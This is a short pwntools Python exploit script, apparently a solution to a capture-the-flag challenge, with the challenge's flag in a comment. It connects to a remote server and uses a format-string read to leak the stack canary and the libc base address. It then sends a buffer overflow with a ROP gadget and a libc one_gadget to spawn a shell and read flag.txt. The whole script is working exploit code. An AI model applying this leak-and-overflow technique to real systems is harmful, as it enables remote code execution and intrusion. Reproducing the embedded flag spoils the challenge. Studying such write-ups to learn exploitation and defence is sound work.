#!/usr/bin/env python
from pwn import *

# pctf{"W@r_1s_N3v3R_@_las41nG_s0lut1on#f0R_any_pr0bleM"}

l = ELF( './libc-2.27.so' )
context.arch = 'amd64'
host , port = '159.89.166.12' , 16000
y = remote( host , port )

p = '%13$p.%15$p.'
y.sendlineafter( 'info:' , p )

y.recvline()
y.recvline()
y.recvline()

canary = int( y.recvuntil( '.' )[2:-1] , 16 )
success( 'canary -> %s' % hex( canary ) )
l.address = int( y.recvuntil( '.' )[:-1] , 16 ) - 0x21b97
success( 'libc -> %s' % hex( l.address ) )

y.sendlineafter( 'info:' , 'Exit' )

rop = ROP(l)
one = 0x4f322

p = flat(
    'a' * 0x18,
    canary,
    rop.find_gadget(['ret'])[0],
    l.address + one,
)
y.sendlineafter( ':' , p + p64( 0 ) * 0x10 )

y.sendline( 'cat flag.txt' )

y.interactive()